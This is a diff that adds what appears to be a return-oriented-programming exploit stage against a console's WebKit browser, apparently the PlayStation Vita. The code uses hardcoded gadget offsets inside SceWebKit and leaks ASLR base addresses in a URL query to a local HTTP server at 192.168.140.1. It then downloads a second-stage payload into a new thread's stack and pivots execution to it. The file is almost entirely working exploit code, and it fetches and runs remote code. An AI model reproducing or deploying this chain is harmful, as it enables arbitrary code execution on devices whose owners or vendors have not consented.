@@ -1,0 +1,63 @@
+#define RETAIL 0
+
+#if RETAIL
+#define PRINTF(fmt, ...) \
+	snprintf(outbuffer, 256, fmt, __VA_ARGS__); \
+	strlen(outbuffer); \
+	send([g_socket], outbuffer, &return, 0, 0, 0);
+#else
+#define PRINTF sceClibPrintf
+#endif
+
+data
+{
+	#include "functions.rop"
+
+	symbol ldm_r1_stuff = ASLR::SceWebKit + 0x54c8; //54c8: e891a916 ldm r1, {r1, r2, r4, r8, fp, sp, pc}
+	symbol pop_pc = ASLR::SceWebKit + 0xc048b;
+	symbol stack_size = 6 * 1024 * 1024;
+
+	variable thread_id = -1;
+	variable http_uid = -1;
+	variable stack_base = -1; // second thread will pivot here
+	buffer thread_info[0x80];
+	buffer download_url[0x100];
+	buffer ldm_buf[7 * 4];
+}
+
+code : entry
+{
+	PRINTF("Hello, world! %d  \n", 123);
+	sceKernelCreateThread("st2", ldm_r1_stuff, 0x10000100, stack_size, 0, 0, 0);
+	store(&return, thread_id);
+	PRINTF("thread %x \n", &return);
+	store(0x7C, thread_info);
+	sceKernelGetThreadInfo([thread_id], thread_info);
+	PRINTF("stack %x  \n", [thread_info + 0x34]);
+	// some free space for function calls
+	add([thread_info + 0x34], 0x1000);
+	store(&return, stack_base);
+
+	snprintf(download_url, 256, "http://192.168.140.1:8000/?a=%x&b=%x&c=%x", ASLR::SceWebKit+0, ASLR::SceLibKernel+0, ASLR::SceLibc+0);
+	PRINTF("%s\n", download_url);
+
+	sceHttpInit(0x10000);
+	sceHttpCreateTemplate("ldr", 2, 1);
+	sceHttpCreateConnectionWithURL(&return, download_url, 0);
+	sceHttpCreateRequestWithURL(&return, 0, download_url, 0, 0, 0);
+	store(&return, http_uid);
+	sceHttpSendRequest([http_uid], 0, 0);
+	sceHttpReadData([http_uid], [stack_base], stack_size);
+
+
+	store(infloop, [stack_base]);
+
+	// prepare args for LDM gadget
+	store([stack_base], ldm_buf+5*4);
+	store(pop_pc, ldm_buf+6*4);
+
+	// start second thread
+	sceKernelStartThread([thread_id], 7 * 4, ldm_buf);
+
+	infloop();
+}
